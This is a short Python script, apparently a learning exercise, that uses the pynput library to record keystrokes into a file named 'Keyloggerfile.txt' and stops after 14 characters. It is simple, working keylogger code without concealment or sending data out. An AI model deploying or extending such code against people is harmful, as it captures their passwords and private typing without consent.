from pynput import keyboard

f = open("Keyloggerfile.txt", "w")
counter = 0  # Initialize a counter for characters typed

def main(key):
    global counter #counter value preserved during all the script's run 
    try:
        f.write(key.char)
        counter += 1  # Increment the counter for each character typed

        # Check if 14 characters have been typed, if yes, stop listening
        if counter >= 14:
            print("14 characters reached. Stopping.")
            return False

    except AttributeError:
        f.write(f' [str{key}] ')


with keyboard.Listener(on_press=main) as listener:
    listener.join()

f.close()
